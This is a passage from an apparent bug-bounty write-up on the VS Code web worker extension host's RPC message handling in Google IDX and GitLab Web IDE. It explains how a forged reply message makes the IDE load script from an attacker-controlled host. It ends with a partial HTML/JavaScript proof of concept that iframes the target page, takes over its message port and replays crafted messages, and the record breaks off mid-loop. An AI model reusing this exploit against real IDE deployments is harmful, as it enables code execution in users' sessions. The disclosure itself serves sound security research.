			<span class="na">args</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span>
		<span class="p">};</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>To decode the buffer messages we can use the same helper methods.</p>

<p>Now back to the <code class="language-plaintext highlighter-rouge">_loadCommonJSModule</code> method and to know what happens inside the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> method.</p>

<p>As there is no such <code class="language-plaintext highlighter-rouge">'$asBrowserUri'</code> property inside the target object, it only contains one <code class="language-plaintext highlighter-rouge">$onWillActivateExtension</code> method continuing with the flow the same method gets called again</p>

<p>This time it‚Äôs the get handler for <code class="language-plaintext highlighter-rouge">_createProxy</code>, it seems as earlier target object didn‚Äôt had the expected <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> property it‚Äôs invoking the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> method to populate target object with it</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kd">const</span> <span class="nx">handler</span> <span class="o">=</span> <span class="p">{</span>
			<span class="na">get</span><span class="p">:</span> <span class="p">(</span><span class="na">target</span><span class="p">:</span> <span class="nx">any</span><span class="p">,</span> <span class="na">name</span><span class="p">:</span> <span class="nx">PropertyKey</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">name</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">===</span> <span class="nx">CharCode</span><span class="p">.</span><span class="nx">DollarSign</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="p">(...</span><span class="na">myArgs</span><span class="p">:</span> <span class="nx">any</span><span class="p">[])</span> <span class="o">=&gt;</span> <span class="p">{</span>
						<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">myArgs</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">serializeRequestArguments</code> is the serialize helper which converts raw json to serialized rpc message. After continuous iterations of checking the same method I noticed that <code class="language-plaintext highlighter-rouge">this._lastMessageId</code> value remains constant for the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">private</span> <span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
       <span class="p">[...]</span>
       <span class="p">[...]</span>

		<span class="kd">const</span> <span class="nx">serializedRequestArguments</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequestArguments</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriReplacer</span><span class="p">);</span>

		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">_lastMessageId</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">callId</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">LazyPromise</span><span class="p">();</span>

		<span class="kd">const</span> <span class="nx">disposable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DisposableStore</span><span class="p">();</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">disposable</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">.</span><span class="nf">onCancellationRequested</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`cancel`</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">));</span>
			<span class="p">}));</span>
		<span class="p">}</span>

		<span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PendingRPCReply</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">disposable</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nf">_onWillSendRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">,</span> <span class="nx">serializedRequestArguments</span><span class="p">,</span> <span class="o">!!</span><span class="nx">cancellationToken</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`request: </span><span class="p">${</span><span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">)}</span><span class="s2">.</span><span class="p">${</span><span class="nx">methodName</span><span class="p">}</span><span class="s2">(`</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
		<span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Based on my understanding this method is responsible for sending the RPC message and also add it to the <code class="language-plaintext highlighter-rouge">this._pendingRPCReplies</code> array the index value is taken from <code class="language-plaintext highlighter-rouge">++this._lastMessageId</code> (here they are using Pre-increment operator) so the <code class="language-plaintext highlighter-rouge">callId</code> value will be +1 whatever was in <code class="language-plaintext highlighter-rouge">this._lastMessageId</code> (remember it as it‚Äôs important)</p>

<p>Still it didn‚Äôt made any sense so I was doing side by side comparison b/w the IDX and Gitlab flow with minified JS (üíÄ)</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181057.png" alt="Pasted image 20240717181057.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181314.png" alt="Pasted image 20240717181314.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181616.png" alt="Pasted image 20240717181616.png" />
<br />
All other values are same other than (those are probably <code class="language-plaintext highlighter-rouge">rpcId</code>)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I 48
K 47
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181818.png" alt="Pasted image 20240717181818.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717181947.png" alt="Pasted image 20240717181947.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717182131.png" alt="Pasted image 20240717182131.png" />
<br />
It all came down to this only  <code class="language-plaintext highlighter-rouge">this.w</code> (<code class="language-plaintext highlighter-rouge">this._pendingRPCReplies</code>)</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240717192305.png" alt="Pasted image 20240717192305.png" /></p>

<p>Stepping more into it and specifically looking where <code class="language-plaintext highlighter-rouge">this.w</code> related code is</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240720121343.png" alt="Pasted image 20240720121343.png" />
<br />
The above code might look familiar (if not to you it does looks familiar to me as I have looked at it so many times) the counterpart from sourcemap is</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveOneMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">:</span> <span class="nx">VSBuffer</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
		<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_isDisposed</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="kd">const</span> <span class="nx">msgLength</span> <span class="o">=</span> <span class="nx">rawmsg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">buff</span> <span class="o">=</span> <span class="nx">MessageBuffer</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">messageType</span> <span class="o">=</span> <span class="o">&lt;</span><span class="nx">MessageType</span><span class="o">&gt;</span><span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt8</span><span class="p">();</span>
		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">buff</span><span class="p">.</span><span class="nf">readUInt32</span><span class="p">();</span>
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">messageType</code> is equal to 9 it went to the below switch case</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="k">case</span> <span class="nx">MessageType</span><span class="p">.</span><span class="nx">ReplyOKJSON</span><span class="p">:</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">deserializeReplyOKJSON</span><span class="p">(</span><span class="nx">buff</span><span class="p">);</span>
				<span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">)</span> <span class="p">{</span>
					<span class="nx">value</span> <span class="o">=</span> <span class="nf">transformIncomingURIs</span><span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriTransformer</span><span class="p">);</span>
				<span class="p">}</span>
				<span class="k">this</span><span class="p">.</span><span class="nf">_receiveReply</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
</code></pre></div></div>

<p>This calls <code class="language-plaintext highlighter-rouge">_receiveReply</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kr">private</span> <span class="nf">_receiveReply</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">req</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">value</span><span class="p">:</span> <span class="nx">any</span><span class="p">):</span> <span class="k">void</span> <span class="p">{</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logIncoming</span><span class="p">(</span><span class="nx">msgLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`receiveReply:`</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">callId</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">.</span><span class="nf">hasOwnProperty</span><span class="p">(</span><span class="nx">callId</span><span class="p">))</span> <span class="p">{</span>
			<span class="k">return</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="kd">const</span> <span class="nx">pendingReply</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">];</span>
		<span class="k">delete</span> <span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">];</span>

		<span class="nx">pendingReply</span><span class="p">.</span><span class="nf">resolveOk</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></div></div>

<p>Everything finally made fucking sense when I reached this method, in the <code class="language-plaintext highlighter-rouge">_remoteCall</code> method which is called before the <code class="language-plaintext highlighter-rouge">fetch</code> call is done.  I explained that it sets the <code class="language-plaintext highlighter-rouge">_pendingRPCReplies</code>.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">private</span> <span class="nf">_remoteCall</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">:</span> <span class="nx">number</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">:</span> <span class="nx">string</span><span class="p">,</span> <span class="nx">args</span><span class="p">:</span> <span class="nx">any</span><span class="p">[]):</span> <span class="nb">Promise</span><span class="o">&lt;</span><span class="nx">any</span><span class="o">&gt;</span> <span class="p">{</span>
       <span class="p">[...]</span>
       <span class="p">[...]</span>

		<span class="kd">const</span> <span class="nx">serializedRequestArguments</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequestArguments</span><span class="p">(</span><span class="nx">args</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">_uriReplacer</span><span class="p">);</span>

		<span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">_lastMessageId</span><span class="p">;</span>
		<span class="kd">const</span> <span class="nx">callId</span> <span class="o">=</span> <span class="nc">String</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">LazyPromise</span><span class="p">();</span>

		<span class="kd">const</span> <span class="nx">disposable</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DisposableStore</span><span class="p">();</span>
		<span class="k">if </span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">disposable</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nx">cancellationToken</span><span class="p">.</span><span class="nf">onCancellationRequested</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
				<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`cancel`</span><span class="p">);</span>
				<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeCancel</span><span class="p">(</span><span class="nx">req</span><span class="p">));</span>
			<span class="p">}));</span>
		<span class="p">}</span>

		<span class="k">this</span><span class="p">.</span><span class="nx">_pendingRPCReplies</span><span class="p">[</span><span class="nx">callId</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PendingRPCReply</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">disposable</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nf">_onWillSendRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">);</span>
		<span class="kd">const</span> <span class="nx">msg</span> <span class="o">=</span> <span class="nx">MessageIO</span><span class="p">.</span><span class="nf">serializeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">rpcId</span><span class="p">,</span> <span class="nx">methodName</span><span class="p">,</span> <span class="nx">serializedRequestArguments</span><span class="p">,</span> <span class="o">!!</span><span class="nx">cancellationToken</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_logger</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">RequestInitiator</span><span class="p">.</span><span class="nx">LocalSide</span><span class="p">,</span> <span class="s2">`request: </span><span class="p">${</span><span class="nf">getStringIdentifierForProxy</span><span class="p">(</span><span class="nx">rpcId</span><span class="p">)}</span><span class="s2">.</span><span class="p">${</span><span class="nx">methodName</span><span class="p">}</span><span class="s2">(`</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">_protocol</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
</code></pre></div></div>

<p>The variable naming is also same, <code class="language-plaintext highlighter-rouge">req</code> same as what was used in <code class="language-plaintext highlighter-rouge">_receiveReply</code> and also both the values are also same in case of Gitlab which is <code class="language-plaintext highlighter-rouge">17</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">req</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">_lastMessageId</span>
</code></pre></div></div>

<p>So what actually happening here is that when <code class="language-plaintext highlighter-rouge">_remoteCall</code> is invoked for <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> , <code class="language-plaintext highlighter-rouge">this._lastMessageId</code> value is 16 doing a pre increment operation on this stores 17 in the <code class="language-plaintext highlighter-rouge">req</code> variable.</p>

<p>The return value of <code class="language-plaintext highlighter-rouge">PendingRPCReply</code> method is stored at the 17 index of <code class="language-plaintext highlighter-rouge">this._pendingRPCReplies</code>.</p>

<p>Now when the worker message handler forwards this serialized message (which we sent from our attacker controlled page, this happens after the <code class="language-plaintext highlighter-rouge">$asBrowserUri</code> is done as described above, here the sequence is important)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\t\x00\x00\x00I\x00\x00\x00O{"$mid":1,"path":"/1.js","scheme":"https","authority":"sudistark.github.io"}'
</code></pre></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">buff.readUInt32()</code> the req value is retrieved which is 17 for the above message and when <code class="language-plaintext highlighter-rouge">_receiveReply</code> gets called <code class="language-plaintext highlighter-rouge">!this._pendingRPCReplies.hasOwnProperty(callId)</code> will be false because there is indeed a property <code class="language-plaintext highlighter-rouge">17</code>.</p>

<p>Next call to <code class="language-plaintext highlighter-rouge">pendingReply.resolveOk(value)</code> sets the value for that rpc method which is then stored in <code class="language-plaintext highlighter-rouge">browserUri</code> and passed to the fetch call :)</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020240718220926.png" alt="Pasted image 20240718220926.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729215328.png" alt="Pasted image 20250729215328.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250729215505.png" alt="Pasted image 20250729215505.png" />
<br />
Sample poc:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://idx-test-1720965673823.cluster-fu5knmr55rd44vy7k7pxk74ams.cloudworkstations.dev/oss-6a96d5dc452450b1ad67667c4e503a014ef0a908/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=0ab5c6f8-8898-4c17-a4b6-46b33d766d11&amp;parentOrigin=http://127.0.0.1:1338"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="c1">// --- utils ---</span>
    <span class="kd">const</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>

    <span class="kd">const</span> <span class="nx">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextEncoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">encoder</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">buffer</span>

    <span class="kd">function</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">hex</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">[\d</span><span class="sr">a-f</span><span class="se">]{2}</span><span class="sr">/gi</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
        <span class="p">})).</span><span class="nx">buffer</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">async</span> <span class="kd">function</span> <span class="nf">fetch_text</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="c1">// --- end utils ---</span>

    <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="nf">add_port</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nf">removeEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">add_port</span><span class="p">)</span>
            <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">port</span>
            <span class="nx">port</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">port_listener</span>
            <span class="nf">send_map</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="kd">function</span> <span class="nf">send_map</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">()</span>
        <span class="kd">const</span> <span class="nx">channel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MessageChannel</span><span class="p">()</span>
        <span class="nx">map</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">gitlab.gitlab-web-ide</span><span class="dl">"</span><span class="p">,</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">)</span>
        <span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">({</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VSCode.init</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">map</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">false</span>
    <span class="kd">function</span> <span class="nf">port_listener</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span>
        <span class="c1">// console.log("%crecived: " + decode(rawmsg), "color: gray")</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">send_called</span> <span class="o">&amp;&amp;</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">02</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The message is an init message</span>
            <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="nf">send_everything</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">)</span>
        <span class="p">})</span>
    <span class="p">}</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">ms</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nf">now</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="s2">`pwn-idx.txt?cacheB=</span><span class="p">${</span><span class="nx">ms</span><span class="p">}</span><span class="s2">`</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
        <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for </span><span class="p">(</span><span class="nx">hex</span> <span class="k">of</span> <span class="nx">hex_lines</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span>
